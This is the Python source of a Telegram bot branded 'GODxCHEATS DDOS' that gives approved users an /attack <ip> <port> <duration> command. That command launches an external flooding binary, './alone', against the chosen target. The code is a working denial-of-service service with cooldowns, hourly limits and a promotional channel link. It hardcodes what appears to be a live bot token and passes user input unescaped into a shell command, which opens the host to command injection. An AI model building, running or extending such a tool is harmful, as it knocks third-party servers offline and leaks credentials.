import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from collections import defaultdict
import time

# Bot token and admin user ID
TELEGRAM_BOT_TOKEN = "7749918794:AAFlgbWy2k9BTzJMPjFB1eJe7G4WUBniMrQ"
ADMIN_USER_ID = 1662672529

# Data structures for managing bot state
approved_users = set()  # Set to store approved user and group IDs
attack_logs = defaultdict(list)  # Store attack logs per user
usage_limits = defaultdict(lambda: {"count": 0, "timestamp": time.time()})  # Track hourly usage limits
cooldown_timers = {}  # Track cooldowns for users
interacted_users = {}  # Track all users who interacted with the bot

# Predefined channel link for the first-time `/attack` users
CHANNEL_LINK = "https://t.me/+03wLVBPurPk2NWRl"

# Track users who interact with the bot
async def track_user(update: Update):
    user = update.effective_user
    interacted_users[user.id] = user.username  # Save username if available

# Start Command
async def start(update: Update, context: CallbackContext):
    await track_user(update)  # Track the user
    chat_id = update.effective_chat.id
    message = (
        "*🔥 WELCOME TO GODxCHEATS DDOS 🔥*\n\n"
        "*Available Commands:*\n"
        " - /attack <ip> <port> <duration> - Launch an attack\n"
        " - /help - View all available commands\n"
        " - /open - Show the username of the user\n\n"
        "*Contact the Owner for Feedback or Support:* @GODxAloneBOY"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

# New /open command
async def open_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user = update.effective_user

    # Check if the user is the owner
    if user.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, text="❌ Only the owner can use this command.")
        return

    # Display the list of all users who interacted with the bot
    if not interacted_users:
        await context.bot.send_message(chat_id, text="ℹ️ No users have interacted with the bot yet.")
        return

    user_list = []
    for user_id, username in interacted_users.items():
        if username:
            user_list.append(f"[@{username}](tg://user?id={user_id})")
        else:
            user_list.append(f"User ID: {user_id} (No username)")

    # Send the list to the owner
    user_list_text = "\n".join(user_list)
    await context.bot.send_message(
        chat_id=chat_id, 
        text=f"👥 Users who interacted with the bot:\n{user_list_text}",
        parse_mode="Markdown"
    )

# Run the attack command
async def run_attack(chat_id, ip, port, duration, context):
    try:
        # Execute the external command
        process = await asyncio.create_subprocess_shell(
            f"./alone {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()

    except Exception as e:
        # Send an error message if the attack fails
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error: {str(e)}")
    finally:
        # Send attack finished message
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ Attack Finished Successfully!*\n\n"
                "*Thank you for using GODxCHEATS DDOS Bot.*\n"
                "*Send Feedback to the Owner:* @GODxAloneBOY"
            ),
            parse_mode="Markdown"
        )

# Approve users or groups
async def approve(update: Update, context: CallbackContext):
    await track_user(update)  # Track the user
    chat_id = update.effective_chat.id
    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, text="❌ You are not authorized to approve users.")
        return

    try:
        if context.args and context.args[0].isdigit():
            approved_users.add(context.args[0])
            await context.bot.send_message(chat_id, text=f"✅ Approved: {context.args[0]}")
        else:
            await context.bot.send_message(chat_id, text="⚠️ Usage: /approve <chat_id>")
    except Exception as e:
        await context.bot.send_message(chat_id, text=f"⚠️ Error: {str(e)}")

# Remove approved users or groups
async def remove(update: Update, context: CallbackContext):
    await track_user(update)  # Track the user
    chat_id = update.effective_chat.id
    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, text="❌ You are not authorized to remove users.")
        return

    try:
        if context.args and context.args[0] in approved_users:
            approved_users.remove(context.args[0])
            await context.bot.send_message(chat_id, text=f"✅ Removed: {context.args[0]}")
        else:
            await context.bot.send_message(chat_id, text="⚠️ User not found or invalid usage.")
    except Exception as e:
        await context.bot.send_message(chat_id, text=f"⚠️ Error: {str(e)}")

# Handle the attack command
async def attack(update: Update, context: CallbackContext):
    await track_user(update)  # Track the user
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is approved
    if str(chat_id) not in approved_users:
        await context.bot.send_message(chat_id, text="❌ You are not authorized to use this command.")
        return

    try:
        # Check cooldown
        if user_id not in cooldown_timers:
            cooldown_timers[user_id] = 0
        if cooldown_timers[user_id] > time.time():
            remaining_time = int(cooldown_timers[user_id] - time.time())
            await context.bot.send_message(chat_id, text=f"⏳ Cooldown active! Try again in {remaining_time} seconds.")
            return

        # Check usage limits
        if usage_limits[user_id]["count"] >= 3 and time.time() - usage_limits[user_id]["timestamp"] < 3600:
            await context.bot.send_message(chat_id, text="❌ You have exceeded your hourly usage limit.")
            return

        # Validate arguments
        if len(context.args) != 3:
            await context.bot.send_message(chat_id, text="⚠️ Usage: /attack <ip> <port> <duration>")
            return

        ip, port, duration = context.args
        if not duration.isdigit() or int(duration) <= 0:
            await context.bot.send_message(chat_id, text="⚠️ Duration must be a positive integer.")
            return

        duration = int(duration)

        # Prevent duplicate attack parameters
        if (ip, port, duration) in attack_logs[user_id]:
            await context.bot.send_message(chat_id, text="⚠️ Duplicate attack parameters detected.")
            return

        # First-time user gets channel link
        if not attack_logs[user_id]:
            await context.bot.send_message(chat_id, text=f"📢 Join our channel for updates: {CHANNEL_LINK}")

        # Log attack details
        attack_logs[user_id].append((ip, port, duration))
        usage_limits[user_id]["count"] += 1
        usage_limits[user_id]["timestamp"] = time.time()
        cooldown_timers[user_id] = time.time() + duration

        # Notify user of the launched attack
        await context.bot.send_message(chat_id=chat_id, text=(
            f"*✅ Attack Launched ✅*\n"
            f"*🎯 Target:* {ip}\n"
            f"*🔌 Port:* {port}\n"
            f"*⏱ Time:* {duration} seconds\n"
        ), parse_mode="Markdown")

        # Launch the attack asynchronously
        asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

    except Exception as e:
        await context.bot.send_message(chat_id, text=f"⚠️ Error: {str(e)}")

# Display bot commands
async def help_command(update: Update, context: CallbackContext):
    await track_user(update)  # Track the user
    chat_id = update.effective_chat.id
    commands = (
        "/approve <chat_id> - Approve a user or group (admin only)\n"
        "/remove <chat_id> - Remove a user or group (admin only)\n"
        "/attack <ip> <port> <duration> - Launch an attack\n"
        "/check - List all active users\n"
        "/help - Show this help message\n"
        "/open - Show the username of the user"
    )
    await context.bot.send_message(chat_id, text=f"Commands:\n{commands}")

# Check active users
async def check(update: Update, context: CallbackContext):
    await track_user(update)  # Track the user
    if update.effective_user.id != ADMIN_USER_ID:
        await context.bot.send_message(update.effective_chat.id, text="❌ Admin access required.")
        return

    if not attack_logs:
        await context.bot.send_message(update.effective_chat.id, text="ℹ️ No active users.")
        return

    active_users = []
    for user_id in attack_logs.keys():
        username = update.effective_user.username
        if username:  # Check if the user has a username
            active_users.append(f"[@{username}](tg://user?id={user_id})")
        else:
            active_users.append(f"User ID: {user_id} (No username)")

    user_list = "\n".join(active_users)
    await context.bot.send_message(
        update.effective_chat.id, 
        text=f"Active Users:\n{user_list}",
        parse_mode="Markdown"
    )

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("open", open_command))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
